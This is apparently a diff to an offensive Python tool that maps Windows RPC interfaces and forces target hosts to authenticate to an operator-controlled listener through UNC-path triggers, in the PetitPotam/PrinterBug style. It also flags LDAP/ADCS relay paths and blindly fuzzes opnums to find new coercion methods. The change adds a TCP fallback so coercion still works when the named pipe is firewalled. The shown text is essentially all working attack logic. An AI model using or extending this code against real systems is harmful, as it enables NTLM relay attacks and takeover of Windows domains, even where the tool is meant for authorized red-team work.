@@ -1197,30 +1197,42 @@ class RPCAuthMap(object):
         return floor
 
     # ---- STAGE 4 : active coercion probe --------------------------------- #
-    def coerce_probe(self, host, descriptor):
+    def coerce_probe(self, host, descriptor, tcp_bindings=None):
         """Try each trigger of a coercible interface; return list of hits.
         A hit = the listener saw a connect-back from host, OR the server threw
-        one of the expected post-dial errors (dialed us but no such file)."""
+        one of the expected post-dial errors (dialed us but no such file).
+        tcp_bindings: optional list of ncacn_ip_tcp stringbindings from the
+        endpoint mapper for this interface, tried as fallback when every pipe
+        fails (e.g. the spooler pipe is firewalled but the TCP port is open)."""
         hits = []
         unc = '\\\\%s\\%s\\file' % (self.listener_ip, _rand_tag())
+        # Build transport list: named pipes first (classic), then TCP fallback.
+        transports = []
         for pipe in descriptor['pipes']:
-            sb = r'ncacn_np:%s[\PIPE\%s]' % (host, pipe)
+            transports.append((r'ncacn_np:%s[\PIPE\%s]' % (host, pipe), pipe))
+        if tcp_bindings:
+            for tb in tcp_bindings:
+                transports.append((tb, 'TCP'))
+        for sb, transport_label in transports:
             for method_name, arg_name, fire in descriptor['triggers']:
-                self._coerce_one(host, sb, descriptor, pipe, method_name,
-                                 fire, unc, hits)
+                self._coerce_one(host, sb, descriptor, transport_label,
+                                 method_name, fire, unc, hits)
                 if any(h['method'] == method_name and h['confirmed'] for h in hits):
-                    # already confirmed via this method on this pipe; move on
                     break
+            # If we got a confirmed hit on this transport, no need to try more
+            if any(h['confirmed'] for h in hits):
+                break
         return hits
 
-    def _coerce_one(self, host, sb, descriptor, pipe, method_name, fire, unc, hits):
+    def _coerce_one(self, host, sb, descriptor, transport_label, method_name,
+                    fire, unc, hits):
         if self.listener:
             self.listener.clear(host)
         rpctransport = transport.DCERPCTransportFactory(sb)
         rpctransport.set_connect_timeout(self.timeout)
         self._set_creds(rpctransport)
         # status: 'confirmed' | 'sent' (reached, no callback) | 'error' (call
-        # faulted in an unexpected way) | 'nobind' (could not even bind the pipe)
+        # faulted in an unexpected way) | 'nobind' (could not even bind)
         try:
             dce = rpctransport.get_dce_rpc()
             dce.set_auth_type(RPC_C_AUTHN_WINNT)
@@ -1228,17 +1240,20 @@ class RPCAuthMap(object):
             dce.connect()
             dce.bind(uuidtup_to_bin(descriptor['uuidtup']))
         except Exception as e:
-            self._dbg('coerce-bind %s via %s' % (method_name, pipe), host, e)
+            self._dbg('coerce-bind %s via %s' % (method_name, transport_label),
+                      host, e)
             es = str(e)
             if 'STATUS_OBJECT_NAME_NOT_FOUND' in es:
-                reason = ('\\PIPE\\%s not present (the backing service is not '
-                          'running on the target)' % pipe)
+                reason = ('\\PIPE\\%s not present (service may not be running '
+                          'or pipe is firewalled)' % transport_label)
             elif 'STATUS_ACCESS_DENIED' in es or 'access_denied' in es.lower():
-                reason = ('access denied opening \\PIPE\\%s with these '
-                          'credentials' % pipe)
+                reason = ('access denied on %s with these credentials'
+                          % transport_label)
+            elif 'timed out' in es.lower() or 'Connection refused' in es:
+                reason = '%s unreachable (timeout or refused)' % transport_label
             else:
                 reason = es.split('\n')[0][:70]
-            hits.append({'iface': descriptor['label'], 'pipe': pipe,
+            hits.append({'iface': descriptor['label'], 'pipe': transport_label,
                          'method': method_name, 'confirmed': False,
                          'status': 'nobind', 'reason': reason})
             return
@@ -1250,7 +1265,8 @@ class RPCAuthMap(object):
             reason = 'call accepted (no fault)'
         except Exception as e:
             es = str(e)
-            self._dbg('coerce-fire %s via %s' % (method_name, pipe), host, e)
+            self._dbg('coerce-fire %s via %s' % (method_name, transport_label),
+                      host, e)
             if any(code in es for code in _EXPECTED_COERCE_ERRORS):
                 status = 'sent'
                 reason = 'post-dial error (reached out)'
@@ -1272,7 +1288,7 @@ class RPCAuthMap(object):
                     break
                 time.sleep(0.25)
         hits.append({
-            'iface': descriptor['label'], 'pipe': pipe,
+            'iface': descriptor['label'], 'pipe': transport_label,
             'method': method_name,
             'confirmed': confirmed,
             'status': 'confirmed' if confirmed else status,
@@ -1344,7 +1360,7 @@ class RPCAuthMap(object):
 
     def _fuzz_fire_one(self, host, sb, uuid_str, ver, inst):
         """Bind + fire one built call; classify by callback / error.
-        verdicts: CONFIRMED, LIKELY, accepted, rejected, nobind."""
+        verdicts: CONFIRMED, LIKELY, no callback, rejected, nobind."""
         if self.listener:
             self.listener.clear(host)
         rpctransport = transport.DCERPCTransportFactory(sb)
@@ -1366,12 +1382,12 @@ class RPCAuthMap(object):
             # none, which otherwise throws "no attribute FuzzCall_opNResponse").
             dce.call(inst.opnum, inst)
             dce.recv()
-            detail = 'call accepted, no error (likely not a path arg)'
+            detail = 'returned OK, no outbound auth — not coercible this way'
         except Exception as e:
             es = str(e)
             if any(code in es for code in _FUZZ_REACHOUT_ERRORS):
                 reached = True
-                detail = 'path-not-found error returned (unconfirmed, no callback)'
+                detail = 'server tried to reach the path (confirm with a real listener)'
             elif 'nca_s_op_rng_error' in es or 'opnum' in es.lower():
                 return 'rejected', 'bad opnum on this build'
             elif 'nca_s_fault' in es or 'NDR' in es or 'unmarshal' in es.lower():
@@ -1394,7 +1410,7 @@ class RPCAuthMap(object):
                 time.sleep(0.2)
         if reached:
             return 'LIKELY', detail
-        return 'accepted', detail
+        return 'no callback', detail
 
     # ---- orchestration per host ------------------------------------------ #
     def scan(self, host):
@@ -1495,7 +1511,12 @@ class RPCAuthMap(object):
                          'fail_reason': ''}
                 if self.do_coerce and not self.fuzz_dry_run:
                     entry['attempted'] = True
-                    hits = self.coerce_probe(host, desc)
+                    # Pass any TCP bindings from the endpoint mapper as
+                    # fallback transport (e.g. when the named pipe is
+                    # firewalled but the service listens on a TCP port).
+                    tcp_bs = [b for b in bindings
+                              if b.startswith('ncacn_ip_tcp')]
+                    hits = self.coerce_probe(host, desc, tcp_bindings=tcp_bs)
                     if any(h['confirmed'] for h in hits):
                         entry['confirmed'] = True
                         coerce_count += 1
@@ -1661,10 +1682,10 @@ class RPCAuthMap(object):
                 lines.append(c('     Cross-protocol: no LDAP/LDAPS/ADCS relay '
                                'path open here', C.GREY))
 
-        # == LEVEL-2 FUZZ (UNVERIFIED CANDIDATES) ==
+        # == LEVEL-2 FUZZ RESULTS ==
         fuzz_hits = []
         if self.do_fuzz:
-            lines.append(c('  == LEVEL-2 FUZZ (UNVERIFIED) ==', C.BOLD + C.CYAN))
+            lines.append(c('  == LEVEL-2 FUZZ RESULTS ==', C.BOLD + C.CYAN))
             if not self.fuzz_candidates:
                 lines.append(c('     No candidate list available (built-in list '
                                'empty and no --candidates file).', C.GREY))
@@ -1672,9 +1693,9 @@ class RPCAuthMap(object):
                 lines.append(c('     No candidate interface from the file was found '
                                'remotely reachable on this host.', C.GREY))
             else:
-                # order: CONFIRMED, LIKELY, accepted, then the quiet ones
+                # order: CONFIRMED, LIKELY, no callback, then the quiet ones
                 rank = {'CONFIRMED': 0, 'LIKELY': 1, 'would-fire': 2,
-                        'accepted': 3, 'rejected': 4, 'skipped': 5,
+                        'no callback': 3, 'rejected': 4, 'skipped': 5,
                         'nobind': 6, 'capped': 7}
                 shown_quiet = 0
                 for fr in sorted(fuzz_results, key=lambda x: rank.get(x['verdict'], 9)):
@@ -1696,9 +1717,9 @@ class RPCAuthMap(object):
                         lines.append('     %s  %s %s  %s'
                                      % (c('would fire', C.CYAN), c(lbl, C.BBLUE),
                                         c(tag, C.GREY), c(fr['detail'], C.GREY)))
-                    elif v == 'accepted':
+                    elif v == 'no callback':
                         lines.append('     %s  %s %s  %s'
-                                     % (c('accepted', C.CYAN), c(lbl, C.BOLD),
+                                     % (c('no callback', C.GREY), c(lbl, C.BOLD),
                                         c(tag, C.GREY), c(fr['detail'], C.GREY)))
                     else:
                         # rejected / skipped / nobind / capped: summarized, quiet
@@ -1874,8 +1895,8 @@ def render_engagement_summary(results):
         n_likely = sum(1 for x in fhits if x['verdict'] == 'LIKELY')
         if n_likely:
             left.append('%s  %s' % (c(r['host'], C.BRED),
-                                    c('+%d fuzz LIKELY (unverified; see the '
-                                      'per-host section)' % n_likely, C.YELLOW)))
+                                    c('+%d fuzz LIKELY (server reached out, '
+                                      'not yet confirmed)' % n_likely, C.YELLOW)))
 
         tags = []
         if r.get('ldap') and 'NOT required' in (r['ldap'] or ''):
@@ -2169,7 +2190,7 @@ def main():
             outfh = None
 
     if options.fuzz and not options.fuzz_dry_run:
-        print(c('[!] LEVEL-2 FUZZ ARMED: blindly firing candidate opnums at '
+        print(c('[!] HUNT ARMED: blindly firing candidate opnums at '
                 'discovered interfaces.', C.BRED))
         print(c('    This is loud and can hang or crash a service. Authorized, '
                 'in-scope targets only.', C.YELLOW))
@@ -2234,8 +2255,8 @@ def main():
     print(c(s1, C.CYAN))
     print(c(s2, C.BOLD))
     if options.fuzz and not options.fuzz_dry_run:
-        s3 = ('[*] Level-2 fuzz: %d new method(s) CONFIRMED, %d LIKELY '
-              '(previously unverified candidates).' % (fuzz_conf, fuzz_likely))
+        s3 = ('[*] Hunt: %d new method(s) CONFIRMED, %d LIKELY '
+              '(server reached out, pending confirmation).' % (fuzz_conf, fuzz_likely))
         print(c(s3, C.BOLD + (C.GREEN if fuzz_conf else C.CYAN)))
 
     summary = render_engagement_summary(results)
